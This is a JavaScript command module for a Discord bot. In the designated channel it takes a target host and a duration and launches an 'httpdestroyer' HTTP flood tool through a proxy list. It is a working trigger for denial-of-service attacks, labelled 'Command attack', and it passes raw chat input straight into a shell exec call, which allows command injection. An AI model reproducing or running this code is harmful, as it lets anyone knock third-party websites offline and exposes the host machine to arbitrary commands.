const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const duration = message.content.split (" ")[2]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }



// Command attack
var exec = require('child_process').exec
exec(`screen -dmS X ./httpdestroyer ${host} ${duration} 35 100 proxy.txt`, (error, stdout, stderr) => {
});





  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['https'],
  permLevel: 0
}

exports.help = {
  name: 'https',
  description: 'interpol',
  usage: 'https'
}
